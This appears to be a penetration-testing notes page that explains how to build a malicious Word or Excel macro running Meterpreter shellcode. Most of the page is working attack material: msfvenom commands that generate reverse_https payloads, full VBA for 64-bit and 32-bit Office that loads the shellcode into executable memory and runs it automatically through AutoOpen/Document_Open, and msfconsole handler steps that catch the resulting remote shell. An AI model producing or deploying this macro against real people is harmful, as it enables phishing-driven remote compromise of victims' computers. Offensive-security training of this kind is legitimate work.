---
title: VBA Shellcode
layout: default
parent: Client Side Execution
---

The theory is always to:
1. Allocate memory with `VirtualAlloc(0, sizeOfShellcodeArray, &H3000, &H40)`
2. Copy shellcode byte by byte into memory location with `RtlMoveMemory(destination, source, length)`
3. Execute with `CreateThread(0, 0, startAddress, 0, 0, 0)`. startAddress here is the return value of `VirtualAlloc()` in step 1.

# For 64-bit!
[32-bit here](#for-32-bit)

First prepare the shellcode:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication
```

Next in Microsoft Word do this:

* Go to View, Select Macros
* **Very Important** Under Macros In, select the current document name (Document1 if unsaved)
* Name the macro AutoOpen (If you change this you need to change multiple references below)
* Save the document as \*.doc (\*.docx will not run macro)
* Change function name for Excel. For example, Document_Open() is called Workbook_Open() in Excel

```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
  Dim buf As Variant
  Dim addr As LongPtr
  Dim counter As Long
  Dim data As LongPtr
  Dim res As LongPtr
  buf = Array(YOUR ARRAY HERE)
  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
  For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
  Next counter
  res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
MyMacro
End Sub

Sub AutoOpen()
MyMacro
End Sub
```

Prepare for the incoming shell:

```
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost IP
set lport PORT
exploit
```

# For 32-bit!
[64-bit here](#for-64-bit)

First prepare the shellcode:

```
msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication
```

Next in Microsoft Word do this:

* Go to View, Select Macros
* **Very Important** Under Macros In, select the current document name (Document1 if unsaved)
* Name the macro AutoOpen (If you change this you need to change multiple references below)
* Save the document as \*.doc (\*.docx will not run macro)
* Change function name for Excel. For example, Document_Open() is called Workbook_Open() in Excel

```vb
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function MyMacro()
  Dim buf As Variant
  Dim addr As LongPtr
  Dim counter As Long
  Dim data As Long
  Dim res As Long
  buf = Array(YOUR ARRAY HERE)
  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
  For counter = LBound(buf) To UBound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
  Next counter
  res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
MyMacro
End Sub

Sub AutoOpen()
MyMacro
End Sub
```

Prepare for the incoming shell:

```
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_https
set lhost IP
set lport PORT
exploit
```
